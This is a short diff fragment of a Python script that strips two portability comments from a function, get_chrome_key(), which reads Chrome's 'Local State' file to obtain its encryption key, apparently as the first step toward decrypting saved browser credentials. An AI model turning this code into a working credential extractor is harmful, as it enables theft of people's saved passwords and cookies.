@@ -4,10 +4,9 @@ import json
 import base64
 from Crypto.Cipher import AES
 from Crypto.Protocol.KDF import PBKDF2
-import win32crypt  # Windows-specific; for cross-platform, use alternative
+import win32crypt
 
 def get_chrome_key():
-    # Windows path; adapt for macOS/Linux
     local_state_path = os.path.expanduser(r"~\AppData\Local\Google\Chrome\User Data\Local State")
     with open(local_state_path, "r", encoding="utf-8") as f:
         local_state = json.load(f)
